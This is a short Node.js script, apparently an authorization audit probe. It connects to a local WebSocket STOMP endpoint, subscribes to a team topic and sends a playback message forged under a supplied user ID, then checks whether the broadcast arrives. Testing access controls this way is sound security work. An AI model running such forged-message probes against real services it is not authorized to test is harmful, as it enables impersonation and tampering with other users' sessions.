const [tid,uid]=process.argv.slice(2);
const ws=new WebSocket('ws://127.0.0.1:18787/ws');
const timer=setTimeout(()=>{console.log('timeout');ws.close();},4000);
ws.onopen=()=>ws.send('CONNECT\naccept-version:1.2\nhost:localhost\n'+(process.env.AUDIT_TOKEN?'Authorization:Bearer '+process.env.AUDIT_TOKEN+'\n':'')+'\n\0');
ws.onmessage=e=>{
 if(String(e.data).startsWith('CONNECTED')){
  console.log('CONNECT accepted');
  ws.send(`SUBSCRIBE\nid:audit\ndestination:/topic/teams/${tid}\n\n\0`);
  setTimeout(()=>ws.send(`SEND\ndestination:/app/teams/${tid}/playback\ncontent-type:application/json\n\n${JSON.stringify({userId:Number(uid),currentPointId:'forged-by-anonymous',playbackStatus:'playing'})}\0`),100);
 } else if(String(e.data).startsWith('MESSAGE')){
  console.log('received team broadcast');clearTimeout(timer);ws.close();
 }
};
